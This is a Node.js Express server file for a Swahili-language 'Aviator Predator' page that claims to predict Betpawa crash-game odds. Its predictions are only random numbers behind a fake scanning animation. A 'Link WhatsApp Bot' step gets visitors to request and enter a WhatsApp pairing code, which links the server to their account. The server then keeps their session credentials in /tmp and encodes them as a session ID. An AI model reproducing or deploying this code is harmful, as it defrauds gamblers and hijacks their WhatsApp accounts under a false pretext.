const express = require('express');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="sw">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>AVIATOR PREDATOR | BETPAWA LIVE</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
                .navbar { background: #ff0000; width: 100%; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; box-shadow: 0 5px 15px rgba(255,0,0,0.4); position: sticky; top: 0; z-index: 100; }
                
                .main-box { background: #111; border: 2px solid #ff0000; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; margin-top: 80px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.5); }
                .live-odds { font-size: 65px; font-weight: bold; color: #ff0000; margin: 20px 0; text-shadow: 0 0 15px rgba(255,0,0,0.7); }
                
                .predict-btn { width: 100%; padding: 18px; background: #ff0000; color: #fff; border: none; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
                .predict-btn:active { transform: scale(0.95); background: #b30000; }
                .predict-btn:disabled { background: #444; color: #888; cursor: not-allowed; }

                .history { margin-top: 20px; text-align: left; background: #1a1a1a; padding: 15px; border-radius: 10px; border: 1px solid #333; }
                .history h4 { margin: 0 0 10px 0; font-size: 12px; color: #ff0000; border-bottom: 1px solid #333; padding-bottom: 5px; }
                .history-list { display: flex; gap: 8px; flex-wrap: wrap; }
                .h-item { font-size: 12px; padding: 4px 8px; border-radius: 5px; background: #333; color: #0f0; font-weight: bold; }

                .setup-wa { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
                input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #ff0000; color: #fff; border-radius: 8px; text-align: center; font-size: 16px; box-sizing: border-box; }
                .wa-btn { width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }

                #loading-container { width: 100%; background: #222; height: 8px; border-radius: 4px; margin-bottom: 15px; display: none; }
                #loading-bar { width: 0%; height: 100%; background: #ff0000; border-radius: 4px; transition: width 0.1s linear; }
            </style>
        </head>
        <body>
            <div class="navbar">AVIATOR PREDATOR - LIVE PREDICTOR</div>
            
            <div class="main-box">
                <div id="loading-container"><div id="loading-bar"></div></div>
                <p style="color: #888; font-size: 12px; letter-spacing: 2px;">STATUS: CONNECTED TO SERVER</p>
                <div class="live-odds" id="oddsDisplay">0.00x</div>
                <button class="predict-btn" id="pBtn" onclick="startScan()">GET NEXT ROUND</button>
                
                <div class="history">
                    <h4>RECENT RESULTS (LATEST)</h4>
                    <div class="history-list" id="hList">
                        <span class="h-item">1.45x</span><span class="h-item">2.10x</span><span class="h-item">1.12x</span>
                    </div>
                </div>

                <div class="setup-wa">
                    <p style="font-size: 12px;">RECEIVE SESSION ID VIA WHATSAPP</p>
                    <input type="text" id="phone" placeholder="2557XXXXXXXX">
                    <button class="wa-btn" onclick="linkWhatsApp()">Link WhatsApp Bot</button>
                    <p id="waStatus" style="font-size: 18px; color: #ff0; margin-top: 10px; font-weight: bold;"></p>
                </div>
            </div>

            <audio id="scanSound" src="https://www.soundjay.com/buttons/beep-07.mp3"></audio>
            <audio id="doneSound" src="https://www.soundjay.com/buttons/button-3.mp3"></audio>

            <script>
                function startScan() {
                    const btn = document.getElementById('pBtn');
                    const odds = document.getElementById('oddsDisplay');
                    const barContainer = document.getElementById('loading-container');
                    const bar = document.getElementById('loading-bar');
                    const hList = document.getElementById('hList');
                    const sScan = document.getElementById('scanSound');
                    const sDone = document.getElementById('doneSound');

                    btn.disabled = true;
                    barContainer.style.display = "block";
                    odds.innerText = "SCANNING...";
                    sScan.play();

                    let progress = 0;
                    const interval = setInterval(() => {
                        progress += 5;
                        bar.style.width = progress + "%";
                        if (progress >= 100) {
                            clearInterval(interval);
                            
                            // Prediction Logic
                            const val = (Math.random() * (4.50 - 1.10) + 1.10).toFixed(2);
                            odds.innerText = val + "x";
                            sDone.play();
                            
                            // Add to History
                            const newItem = document.createElement('span');
                            newItem.className = 'h-item';
                            newItem.innerText = val + "x";
                            hList.prepend(newItem);
                            if(hList.children.length > 5) hList.lastChild.remove();

                            setTimeout(() => {
                                btn.disabled = false;
                                bar.style.width = "0%";
                                barContainer.style.display = "none";
                            }, 1000);
                        }
                    }, 100);
                }

                async function linkWhatsApp() {
                    const num = document.getElementById('phone').value.replace(/[^0-9]/g, '');
                    if(!num) return alert('Weka namba sahihi!');
                    document.getElementById('waStatus').innerText = "Generating Code...";
                    const r = await fetch('/get-code?num=' + num);
                    const d = await r.json();
                    document.getElementById('waStatus').innerText = "CODE: " + (d.code || "RETRY");
                }
            </script>
        </body>
        </html>
    `);
});

// WhatsApp Engine
app.get('/get-code', async (req, res) => {
    let num = req.query.num;
    const { state, saveCreds } = await useMultiFileAuthState(path.join('/tmp', 'aviator-' + num));

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "fatal" }),
        browser: Browsers.macOS("Chrome")
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const sessionID = Buffer.from(JSON.stringify(state.creds)).toString('base64');
            await sock.sendMessage(sock.user.id, { 
                text: `*🚀 AVIATOR PREDATOR V5 ACTIVATED!*\n\nDashboard yako sasa iko tayari.\n\n*Session ID:* \n\`${sessionID}\`` 
            });
        }
    });

    if (!sock.authState.creds.registered) {
        await delay(2000);
        let code = await sock.requestPairingCode(num);
        res.json({ code });
    }
});

app.listen(PORT, () => console.log(`Aviator Predator Premium Active!`));
